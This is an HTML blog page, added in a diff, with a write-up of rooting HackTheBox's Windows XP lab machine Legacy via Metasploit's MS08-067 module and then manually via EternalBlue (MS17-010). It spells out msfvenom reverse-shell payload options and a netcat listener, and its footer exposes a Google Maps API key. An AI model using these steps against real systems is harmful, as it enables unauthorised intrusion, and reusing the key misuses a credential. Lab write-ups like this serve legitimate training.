@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+  <meta charset="utf-8">
+  <title>Legacy HackTheBox - Write-Up</title>
+
+  <!-- mobile responsive meta -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Rooting the Legacy box from HackTheBox">
+  <meta name="author" content="See the description ...">
+  <meta name="generator" content="Hugo 0.71.0" />
+
+  <!-- plugins -->
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/bootstrap/bootstrap.min.css">
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/Ionicons/css/ionicons.min.css">
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/magnific-popup/magnific-popup.css">
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/slick/slick.css">
+  
+
+  <!-- Main Stylesheet -->
+  
+  <link rel="stylesheet" href="http://192.168.1.191/scss/style.min.css" media="screen">
+
+  <!--Favicon-->
+  <link rel="shortcut icon" href="http://192.168.1.191/images/favicon.png" type="image/x-icon">
+  <link rel="icon" href="http://192.168.1.191/images/favicon.png" type="image/x-icon">
+
+</head><body>
+<!-- preloader start -->
+<div class="preloader">
+  
+</div>
+<!-- preloader end -->
+
+<header class="navigation">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-12">
+        
+        <nav class="navbar">
+          
+          <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navigation">
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">
+              <img src="http://192.168.1.191/images/home.jpeg" alt="Chapl1n" class="img-responsive">
+            </a>
+          </div>
+          
+          <div class="collapse navbar-collapse" id="navigation">
+            <ul class="nav navbar-nav navbar-right">
+              <li><a href="http://192.168.1.191">Home</a></li>
+
+              
+              
+              <li><a href="http://192.168.1.191/about">About</a></li>
+              
+              
+              
+              <li><a href="http://192.168.1.191/project">Projects</a></li>
+              
+              
+              
+              <li><a href="http://192.168.1.191/blog">Blog</a></li>
+              
+              
+              
+              <li><a href="https://twitter.com/MrChapl1n">Twitter</a></li>
+              
+              
+
+              
+
+            </ul>
+          </div>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+<section class="page-title bg-2" style="background-image: url('http://192.168.1.191/images/featue-bg.jpg');">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-12">
+        <div class="block">
+          <h1>Legacy HackTheBox - Write-Up</h1>
+          <p>Rooting the Legacy box from HackTheBox</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="page-wrapper">
+	<div class="container">
+		<div class="row">
+			<div class="col-md-8">
+				<div class="post post-single">
+					<h2 class="post-title">Legacy HackTheBox - Write-Up</h2>
+					<div class="post-meta">
+						<ul>
+              <li><i class="ion-calendar"></i> June 3, 2020</li>
+              <li><i class="ion-android-people"></i>
+                Posted By
+                
+                <a class="text-primary" href="/author/chapl1n">Chapl1n</a>
+                
+              </li>
+              <li><i class="ion-pricetags"></i> 
+                
+                <a href="/tags/hackthebox">Hack the box</a>
+								
+                , <a href="/tags/windows">Windows</a>
+								
+                , <a href="/tags/smb">Smb</a>
+								
+                , <a href="/tags/eternalblue">Eternalblue</a>
+								
+              </li>
+            </ul>
+					</div>
+					<div class="post-thumb">
+						<img class="img-responsive" src="/images/blog/legacy/Legacy/cover.jpg" alt="Legacy HackTheBox - Write-Up">
+					</div>
+					<div class="post-content post-excerpt">
+						<p>The HackTheBox machine <code>Legacy</code> represents the start of my journey into the field of ethical hacking. As I progress through these pieces I will explain my approach through each of the phases of a pen test. I will attempt to show different ways to root the same machine using automatic tools like Metasploit or by a more manual approach using compiled exploit scripts. I don&rsquo;t want to be complacent and only learn one way of doing things as tools such as Metasploit may not always be available to me on future pen tests.  In the future, I aspire to study for the OSCP (Offensive Security Certified Professional) certification offered by Offensive Security.</p>
+<h1 id="section-1---with-metasploit"><strong>Section 1 - With Metasploit</strong></h1>
+<h1 id="reconnaissance"><strong>Reconnaissance</strong></h1>
+<h3 id="step-1---initial-nmap-scan">Step 1 - Initial nmap scan</h3>
+<p>I start my pen test by using the network scanning tool <code>nmap</code>, this allows me to find out what TCP/UDP ports are open on a target system and the running services. Nmap will be used in a two step approach, first by scanning to see what ports are open, and second, scanning these open ports for more information on the services running. This is because trying to aggressively scan 65535 ports with many likely being closed would take a lot of time.</p>
+<p><img src="/images/blog/legacy/Legacy/photo_1.png" width="100%" alt="Initial nmap scan - HackTheBox Writeup by Chapl1n - Legacy" /></p>
+<p>The scan shows that two ports are open on Legacy - <code>139</code> and <code>445</code>. I am aware of the significance of these ports because they are commonly used for the SMB (Server Message Block) protocol. SMB is a protocol used by many file sharing systems that have been repeatedly exploited. I am only doing a breakdown for this nmap scan as it is my first writeup; later writeups will not have this breakdown unless different switch statements are used.</p>
+<blockquote>
+<p><code>nmap</code> = The command line scanning tool being used, the following syntax will be arguements used to specify how the scan will be done.<br>
+<code>-T4</code> = T4 represents the speed at which the scan will be done on the target system (T0 - slowest, T5 - fastest).<br>
+<code>-Pn</code> = This arguement is being used to specify that I know the host is online and do not want to do any form of host discovery that would slow the scan down.<br>
+<code>-n</code> = This arguement specifies that I do not want any DNS resolution for the IP address and ports since this will take to much time.<br>
+<code>-min-rate=1000</code> = This specifies the minimum number of probing packets that will be sent per second.<br>
+<code>-max-rate=5000</code> = This specifies the maximum number of probing packets that will be sent per second.<br>
+<code>-p-</code> = This arguement specifies that I want to scan all ports (1-65535).<br>
+<code>--open</code> = This arguement specifies that I only want to get the ports returned that are open as results.<br>
+<code>10.10.10.4</code> = This is the IP address of the Legacy box.</p>
+</blockquote>
+<h3 id="step-2---aggressive-nmap-scan">Step 2 - Aggressive nmap scan</h3>
+<p>So the intial scan is done and I know what TCP ports are open, now it is time to get more information on the services running.</p>
+<p><img src="/images/blog/legacy/Legacy/photo_2.png" alt="Aggressive nmap scan - HackTheBox - Legacy"></p>
+<blockquote>
+<p><code>--max-retries=1</code> = Since I know that the target port is open, I theoretically only need to send one probe packet to that port. Some may choose to do more in the scenario that the first fails.<br>
+<code>-p 139,445</code> = Beforehand, I used the syntax -p- to scan all the ports, but since I know what ports are open (139 and 445), I only have to sepcify them. <strong>Note</strong>, ensure that there is no spaces between the commas for the port list or they will be ignored after the first space for scanning (I learned the hard way).<br>
+<code>-A</code> = This specifes that I will be doing an aggressive scan and this includes OS detection and in-depth information about services running on the open ports.<br>
+<code>-oA tcp_Aggressive_Legacy_Scan</code> = This arguement specifies that I want to output the results of the aggressive TCP scan to all possible formats. They include .nmap, .gnmap and .xml.  The .nmap is a very human readable format, whereas the .gnmap and .xml are design to be used with scripts and other tools.</p>
+</blockquote>
+<h3 id="step-3---reviewing-the-results">Step 3 - Reviewing the results</h3>
+<p><img src="/images/blog/legacy/Legacy/photo_3.png" alt="Agressive nmap scan result - HackTheBox - Legacy"></p>
+<p>I learn two things pretty quickly with this scan - that Legacy is an Windows XP system and that there is an SMB file share system on it.</p>
+<h1 id="enumeration"><strong>Enumeration</strong></h1>
+<p>I know that Legacy has an SMB server running on it, but what version is it? If I know what version it is, then I can look about for potential exploits.</p>
+<h3 id="step-1---loading-up-metasploit">Step 1 - Loading up Metasploit</h3>
+<p>I start by loading up Metasploit with the <code>msfconsole</code> command.</p>
+<p><img src="/images/blog/legacy/Legacy/photo_4.png" alt="Metasploit command - HackTheBox - Legacy"></p>
+<p><img src="/images/blog/legacy/Legacy/photo_5.png" alt="Metasploit interface - HackTheBox - Legacy"></p>
+<p>Metasploit has a lot of modules and I need to narrow down my search results to modules for SMB.</p>
+<h3 id="step-2---search-for-smb">Step 2 - Search for SMB</h3>
+<p><img src="/images/blog/legacy/Legacy/photo_6.png" alt="SMB search - HackTheBox - Legacy"></p>
+<p>Even after this initial search there is still a lot of modules related to SMB. I want an auxiliary module that will enumerate Legacy and give me the version number of the server used. After looking through the modules I notice module 61.</p>
+<p><img src="/images/blog/legacy/Legacy/photo_7.png" alt="SMB Metasploit - Auxiliary Module - HackTheBox - Legacy"></p>
+<p>This module will give me what I need and can be loaded in either of the following ways:</p>
+<blockquote>
+<p><code>msf5 &gt; use 61</code><br>
+<code>msf5 &gt; use auxiliary/scanner/smb/smb_version</code></p>
+</blockquote>
+<h3 id="step-3---configure-module">Step 3 - Configure module</h3>
+<p><img src="/images/blog/legacy/Legacy/photo_8.png" alt="SMB auxiliary - Auxiliary Module loaded - HackTheBox - Legacy"></p>
+<p>In order to use the module appropriately against Legacy it needs to be configured. The configurations can be viewed with the <code>options</code> command.</p>
+<p><img src="/images/blog/legacy/Legacy/photo_9.png" alt="SMB Module Configuration - HackTheBox - Legacy"></p>
+<p>This module has two mandatory requirements that must be set:</p>
+<blockquote>
+<p><code>RHOSTS</code> - The IP address of the target box (Legacy)<br>
+<code>THREADS</code> - The number of concurrent threads</p>
+</blockquote>
+<p>I do not have to give values for <code>SMBDomain</code>, <code>SMBPass</code> and <code>SMBUser</code> as they are not mandatory.<br>
+I start by setting the value for RHOSTS.</p>
+<p><img src="/images/blog/legacy/Legacy/photo_10.png" alt="Setting Target IP - Metasploit - HackTheBox - Legacy"></p>
+<p>The THREADS option is a value that depends on the user. I set the value to 10 but some may set it higher or lower, just depends on the situation.</p>
+<p><img src="/images/blog/legacy/Legacy/photo_11.png" alt="Setting number of threads - Metasploit - HackTheBox - Legacy"></p>
+<p>Once the options for the module have been configured, it can be executed. This can be done with one of the following commands, <code>run</code> or <code>exploit</code>.</p>
+<h3 id="step-4---execute-module">Step 4 - Execute module</h3>
+<p><img src="/images/blog/legacy/Legacy/photo_12.png" alt="Run command for execution - Metasploit - HackTheBox - Legacy"></p>
+<p><img src="/images/blog/legacy/Legacy/photo_13.png" alt="Execute command for execution - Metasploit - HackTheBox - Legacy"></p>
+<p>Run or exploit will do the same job, it doesn&rsquo;t matter which one is chosen. The screenshot below details the result of using this module against Legacy.</p>
+<p><img src="/images/blog/legacy/Legacy/photo_14.png" alt="SMB Module results - Metasploit - HackTheBox - Legacy"></p>
+<p>If the colour of the module result is blue/green, it is a success, and the result shows that Legacy is running Windows XP SP3 (Service Pack 3). With the SMB version number now known, I can identify an exploit to use against Legacy.</p>
+<h3 id="step-5---identify-exploits">Step 5 - Identify exploits</h3>
+<p>There are a couple of resources that can be leveraged for finding potential exploits to use against Legacy. The first tool being used is called <code>searchsploit</code>. This takes parameters and enumerates the exploitdb database to find related exploits. I am looking for any matches related to Windows XP SP3.</p>
+<p><img src="/images/blog/legacy/Legacy/photo_15.png" alt="Searchsploit - Windows XP SP3 - HackTheBox - Legacy"></p>
+<p>This search is done and gives me a brief overview of what is out there for exploiting Legacy. <code>Google</code> is the next tool to be used since a large proportion of exploits and vulnerabilities are publicly documented.</p>
+<blockquote>
+<p><img src="/images/blog/legacy/Legacy/photo_17.png" alt="Exploit search results - Windows XP SP3 - HackTheBox - Legacy"></p>
+</blockquote>
+<p>The first result details a vulnerability called <code>MS08-067</code>. This is quite interesting because this vulnerability was a big deal when first discovered back in 2008, it allows threat actors to gain remote code execution (RCE) capabilities on vulnerabale Windows systems. Microsoft products affected by this vulnerability included Windows 2000, XP and Sever 2003.</p>
+<blockquote>
+<p><img src="/images/blog/legacy/Legacy/photo_19.png" alt="Rapid7 - MS08-067 - Metasploit - HackTheBox - Legacy"></p>
+</blockquote>
+<p>Rapid7 gives me instructions on how to configure the exploit module.</p>
+<h1 id="exploitation"><strong>Exploitation</strong></h1>
+<h3 id="step-1---load-metasploit-attack-module">Step 1 - Load Metasploit attack module</h3>
+<p><img src="/images/blog/legacy/Legacy/photo_20.png" alt="Exploit Loaded - MS08-067 - Metasploit - HackTheBox - Legacy"></p>
+<p>The module has been loaded and needs to be configured to target Legacy.</p>
+<h3 id="step-2---configure-module">Step 2 - Configure module</h3>
+<p><img src="/images/blog/legacy/Legacy/photo_21.png" alt="Exploit Module Configuration - MS08-067 - Metasploit - HackTheBox - Legacy"></p>
+<p>I first set the RHOSTS value to the IP address of Legacy (<code>10.10.10.4</code>). Normally the RPORT needs to be set as well, but in this scenario, 445 is already the port I want, so no futher configuration is needed. I check my options again to ensure everything is good.</p>
+<p><img src="/images/blog/legacy/Legacy/photo_23.png" alt="Updated module configurations"></p>
+<p>The payload is configured and executed.</p>
+<h3 id="step-3---execute-payload">Step 3 - Execute payload</h3>
+<p><img src="/images/blog/legacy/Legacy/photo_24.png" alt="Execute Exploit module - MS08-067 - Metasploit - HackTheBox - Legacy"></p>
+<p>After execution, a meterpreter session is established between Legacy and my attacking box. Meterpreter is a post-exploitation attack payload within Metasploit that enables shell connections with a target system to be easily established. In order to access the file contents of Legacy I need to use the <code>shell</code> command.</p>
+<h3 id="step-4---reverse-shell-session">Step 4 - Reverse shell session</h3>
+<p><img src="/images/blog/legacy/Legacy/photo_25.png" alt="Windows Shell Creation - HackTheBox - Legacy"></p>
+<h3 id="step-5---finding-root-flag">Step 5 - Finding root flag</h3>
+<p>The reverse shell connection is established on Legacy and I have been placed in the <code>Desktop</code> folder of the Administrator. Since this is a Windows system, I need to use Windows syntax for the command-line (sadly) instead of Linux. The <code>ls</code> equivalent in Windows is <code>dir</code>.</p>
+<p><img src="/images/blog/legacy/Legacy/photo_26.png" alt="Listing Desktop directory"></p>
+<p>There is a text file called <code>root.txt</code> within the folder so I opened it, expecting this to be the flag I want.  And it is!</p>
+<p><img src="/images/blog/legacy/Legacy/photo_27.png" alt="Identified root flag"></p>
+<p>I submit this data to HackTheBox and it turns out to be the root flag for Legacy.</p>
+<p><strong>Note:</strong> Even though I was able to get the root flag for Legacy, it&rsquo;s good practice to check my privilege levels within a system. This is a rookie mistake that I made and got lucky with as no privilege escalation was necessary.</p>
+<h1 id="section-2---without-metasploit"><strong>Section 2 - Without Metasploit</strong></h1>
+<p>Metasploit is an amazing tool for pentesting but it is also an extremely easy one to rely on. This may seem like a weird thing to say but the reality is that when I want to do high-level certifications such as the Offensive Security Certified Professional (OSCP), they only allow Metasploit to be used once. Treat Metasploit like an ace up your sleeve or your last trump card.  It should be only be used as a last resort. It is also good practice to be as resourceful as possible for different situations. What happens if the only tools you use do not work on a target system and you&rsquo;re out of luck? The point of this section is to show how I can get the same root flag but without ever using Metasploit.</p>
+<h1 id="reconnaissance-revisited"><strong>Reconnaissance</strong> (Revisited)</h1>
+<h3 id="step-1---reviewing-aggressiv-nmap-scan">Step 1 - Reviewing aggressiv nmap scan</h3>
+<p>There is no point in re-doing the nmap scans since the results are the same and I don&rsquo;t need to explain the syntax like in Section 1.</p>
+<p><img src="/images/blog/legacy/Legacy/photo_28.png" alt="Agressive Nmap Scan - HackTheBox - Legacy"></p>
+<p>My initial plan was to use a tool called <code>smbclient</code> in parallel with <code>Wireshark</code> to grab the SMB version information. Smbclient is a samba client tool that is used to connect to remote samba smb servers and when I attempt to connect to the Legacy SMB server, I would use Wireshark to grab all the packets during this exchange in order for me to get the SMB server version information. However, when I did the smbclient request I received unwanted message:</p>
+<p><img src="/images/blog/legacy/Legacy/photo_29.png" alt="Smbclient Failure - HackTheBox - Legacy"></p>
+<h3 id="step-2---enumerate-smb-file-share">Step 2 - Enumerate SMB file share</h3>
+<p>I found this weird, so I used the tool <code>enum4linux</code> that can enumerate information from Windows and Samba systems. I hoped it would help me get more information on the SMB file share for Legacy and why the smbclient command failed. I ran the command:</p>
+<p><img src="/images/blog/legacy/Legacy/photo_30.png" alt="Enum4linux - HackTheBox - Legacy"></p>
+<p>When I scrolled through the results and went to the <code>OS information</code> section for Legacy, I noticed the following:</p>
+<p><img src="/images/blog/legacy/Legacy/photo_31.png" alt="Target OS information - HackTheBox - Legacy"></p>
+<p>I am not able to connect to the server and need to find an alternative method to get SMB information for potential vulnerabilites.
+This is where nmap came to save the day. Nmap has something called the <code>Nmap Scripting Engine (NSE)</code> that can be used to execute scripts through nmap. These scripts can be used for network discovery, version detection and vulnerability detection.</p>
+<h3 id="step-3---nmap-smb-vulnerability-scan">Step 3 - Nmap SMB vulnerability scan</h3>
+<p><img src="/images/blog/legacy/Legacy/photo_32.png" alt="Nmap SMB Vulnerability Scan - HackTheBox - Legacy"></p>
+<blockquote>
+<p><code>sudo nmap</code> = I am not currently a root user, which is why I had to use sudo (<strong>s</strong>uper <strong>u</strong>ser <strong>d</strong>o <strong>o</strong>nce) to call the nmap command.<br>
+<code>--script smb-vuln</code> = Running a script within NSE that looks for all the smb vulnerabilities on the target system.<br>
+<code>-p445 10.10.10.4</code> = The NSE is running the vulnerability detection script on port 445 of the Legacy box since the smb server is running on this port.</p>
+</blockquote>
+<p><img src="/images/blog/legacy/Legacy/photo_33.png" alt="Vulnerability Scan Results - HackTheBox - Legacy"></p>
+<p>The results indicate a vulnerability called <code>MS17-010</code>. For anyone that doesn&rsquo;t know, it&rsquo;s alternaitve name is <code>EternalBlue</code>. EternalBlue will likely be remembered by a lot of people because of the Wannacry Ransomware back in 2017. EternalBlue is an exploit in SMB version 1 that provides threat actors RCE capabilities on vulenerable Windows systems. I could have used searchsploit for an exploit but in many cases exploitdb is not the most up-to-date for exploits. I therefore hoped get something from Github as this likely has the most recent content.<br>
+The Google Fu search I used was <code>site:github.com ms17-010</code>. This specifically gave me web results from Github related to MS17-010.</p>
+<blockquote>
+<p><img src="/images/blog/legacy/Legacy/photo_34.png" alt="MS17-010 Google Fu - HackTheBox - Legacy"></p>
+</blockquote>
+<p>Of the possible Git repositories available, I will use the <a href="https://github.com/helviojunior/MS17-010"><code>helviojunior</code></a> exploit for MS17-010.</p>
+<h1 id="exploitation-1"><strong>Exploitation</strong></h1>
+<h3 id="step-1---clone-github-repository">Step 1 - Clone github repository</h3>
+<p>The first step is to clone the repo needed.</p>
+<p><img src="/images/blog/legacy/Legacy/photo_35.png" alt="Cloning Git Repository - HackTheBox - Legacy"></p>
+<p>Listing my current directory will show a directory called MS17-010:</p>
+<p><img src="/images/blog/legacy/Legacy/photo_36.png" alt="Listing directory contents"></p>
+<p>When the folder is opened, several different scripts are available.</p>
+<p><img src="/images/blog/legacy/Legacy/photo_37.png" alt="Listing exploit directory"></p>
+<p>Before I am able to execute the script for gaining remote access, I need to create a reverse shell payload that provides a connection between Legacy and my attacking box. To do this I leverage a tool called <code>msfvenom</code>. This is a command line instance of Metasploit but unlike Metasploit, this can be used to our hearts desire for exams like the OSCP.</p>
+<h3 id="step-2---create-reverse-shell-executable">Step 2 - Create reverse shell executable</h3>
+<p><img src="/images/blog/legacy/Legacy/photo_38.png" alt="MSFvenom Reverse Shell - HackTheBox - Legacy"></p>
+<blockquote>
+<p><code>msfvenom</code> = The command line tool itself.<br>
+<code>-p</code> = This arguement is used to specify that we are using a payload.<br>
+<code>windows/shell_reverse_tcp</code> = This is the payload we are using for this command and means we are trying to get a tcp windows reverse shell on Legacy to my student system.<br>
+<code>LHOST=10.10.16.165</code> = This is the IP of the attacking box which will be in a listening state waiting for a shell from the victim Legacy.<br>
+<code>LPORT=4444</code> = This is the port in which my attacking box will be listening on waiting for a connection.<br>
+/images/blog/legacy/Legacy/photo_2.png<code>-f exe &gt; shell.exe</code> = Similar to the nmap scans, the last part of the command specifies that we are saving the reverse shell payload to an executable file with the name shell.exe. You can also specify a pathway for where this file is stored but I am cool with it being in my current directory.</p>
+</blockquote>
+<p>With the reverse shell sorted, a listener must be set up on my attacking box on the port specified in the msfvenom command to receive the connection. Just for reference, there is no particular reason for me using port 4444, it&rsquo;s just a random port that seems to be used a lot for reverse shells.</p>
+<h3 id="step-3---establish-listener">Step 3 - Establish listener</h3>
+<p><img src="/images/blog/legacy/Legacy/photo_39.png" alt="Listening Attacker - HackTheBox - Legacy"></p>
+<p>I am using a command line tool called <code>nc</code> (netcat) which can be used for establishing connections and listeners for TCP and UDP.</p>
+<blockquote>
+<p><code>-n</code> = This means that I do not want any DNS/server lookups for the IP address and port.<br>
+<code>-l</code> = This specifies that the nc command should be listening for an incoming connection rather than trying to initate a connection with a remote host.<br>
+<code>-v</code> = This means that the nc command will give more verbose ouput.<br>
+<code>-p</code> = This is the source port that the attacking box will be listening on.<br>
+<code>4444</code> = This is the port in which the attacking box is listening on.</p>
+</blockquote>
+<p>Usually you would seperate the arguements for command line tools but in this scenario I am able to use them together. The order by which these done are done does not matter.<br>
+On a different terminal I use the python script <code>send_and_execute.py</code> to establish the reverse shell from Legacy to my attacking box. I specify the IP of the Legacy box and then use the shell.exe payload to establish the connection.</p>
+<h3 id="step-4---create-reverse-shell">Step 4 - Create reverse shell</h3>
+<p><img src="/images/blog/legacy/Legacy/photo_40.png" alt="Executing Reverse Shell - HackTheBox - Legacy"></p>
+<p>When I go back to the terminal where I initiated the listening session, a reverse shell with Legacy has been established.</p>
+<h3 id="step-5---finding-root-flag-1">Step 5 - Finding root flag</h3>
+<p><img src="/images/blog/legacy/Legacy/photo_41.png" alt="Reverse created on attacking box"></p>
+<p>My first task is to get to the base of the C directory and work my way down the tree to find the root flag.</p>
+<p><img src="/images/blog/legacy/Legacy/photo_42.png" alt="Changing to root of C directory"></p>
+<p>I remember from Section 1 that the root flat is on the Desktop folder within Adminstrator directory.</p>
+<p><img src="/images/blog/legacy/Legacy/photo_46.png" alt="Listing Desktop directory"></p>
+<p>Low and behold I find the <code>root.txt</code> file and once I view its contents I find the root flag for Legacy.</p>
+<p><img src="/images/blog/legacy/Legacy/photo_47.png" alt="Finding root flag"></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>As a first pen test, I am quite happy with how it went. I got to learn about tools and methods used to progress in pwning a system. I got experience with the Metasploit Framework as well creating payloads to access a target&rsquo;s file system.</p>
+
+					</div>
+					<div class="post-comments">
+						
+					</div>
+				</div>
+			</div>
+      <div class="col-md-4">
+        <aside class="sidebar"><div class="widget widget-latest-post">
+    <h4 class="widget-title">Latest Posts</h4>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/nibbles/">
+        <img class="media-object" src="/images/blog/nibbles/nibbles_image.jpg" alt="Nibbles HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/nibbles/">Nibbles HackTheBox - Write-Up</a></h4>
+        <p>This writeup will demonstrate my approach for …</p>
+      </div>
+    </div>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/jerry/">
+        <img class="media-object" src="/images/blog/jerry/snippet_1.png" alt="Jerry HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/jerry/">Jerry HackTheBox - Write-Up</a></h4>
+        <p>This writeup will be my approach for …</p>
+      </div>
+    </div>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/devel/">
+        <img class="media-object" src="/images/blog/devel/cover.jpg" alt="Devel HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/devel/">Devel HackTheBox - Write-Up</a></h4>
+        <p>The first three &lsquo;HackTheBox&rsquo; writeups …</p>
+      </div>
+    </div>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/blue/">
+        <img class="media-object" src="/images/blog/blue/cover.jpg" alt="Blue HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/blue/">Blue HackTheBox - Write-Up</a></h4>
+        <p>This blog piece details my approach for pwning the …</p>
+      </div>
+    </div>
+    
+  </div><div class="widget widget-category">
+    <h4 class="widget-title">Categories</h4>
+    <ul class="widget-category-list">
+      <li><a href="/categories/hackthebox">Hackthebox</a></li>
+    </ul>
+  </div><div class="widget widget-tag">
+    <h4 class="widget-title">Tags</h4>
+    <ul class="widget-tag-list">
+      <li><a href="/tags/apache">Apache</a></li>
+      <li><a href="/tags/distcc">Distcc</a></li>
+      <li><a href="/tags/eternalblue">Eternalblue</a></li>
+      <li><a href="/tags/exploit-compilation">Exploit compilation</a></li>
+      <li><a href="/tags/exploit-modification">Exploit modification</a></li>
+      <li><a href="/tags/ftp">Ftp</a></li>
+      <li><a href="/tags/hackthebox">Hackthebox</a></li>
+      <li><a href="/tags/http">Http</a></li>
+      <li><a href="/tags/linux">Linux</a></li>
+      <li><a href="/tags/misconfiguration">Misconfiguration</a></li>
+      <li><a href="/tags/privesc">Privesc</a></li>
+      <li><a href="/tags/smb">Smb</a></li>
+      <li><a href="/tags/spidering">Spidering</a></li>
+      <li><a href="/tags/tty">Tty</a></li>
+      <li><a href="/tags/tty-shell">Tty shell</a></li>
+      <li><a href="/tags/web-shell">Web shell</a></li>
+      <li><a href="/tags/windows">Windows</a></li>
+    </ul>
+  </div></aside>
+
+      </div>
+		</div>
+	</div>
+</section>
+
+<footer class="footer">
+	<div class="container">
+		<div class="row">
+			<div class="col-md-12">
+				<div class="footer-manu">
+					<ul>
+            
+            <li><a href="http://192.168.1.191/about">About</a></li>
+            
+            <li><a href="http://192.168.1.191/project">Project</a></li>
+            
+            <li><a href="http://192.168.1.191/blog">Blog</a></li>
+            
+					</ul>
+				</div>
+				<p class="copyright">Copyright © 2020 <a href="https://themefisher.com">Themefisher</a> All Rights Reserved</p>
+			</div>
+		</div>
+	</div>
+</footer>
+
+
+
+<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCcABaamniA6OL5YvYSpB3pFMNrXwXnLwU&amp;libraries=places"></script>
+
+
+
+
+<script src="http://192.168.1.191/plugins/jQuery/jquery.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/bootstrap/bootstrap.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/slick/slick.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/magnific-popup/jquery.magnific-popup.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/shuffle/shuffle.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/google-map/gmap.js"></script>
+
+
+
+
+<script src="http://192.168.1.191/js/script.min.js"></script>
+
+
+</body>
+
+</html>
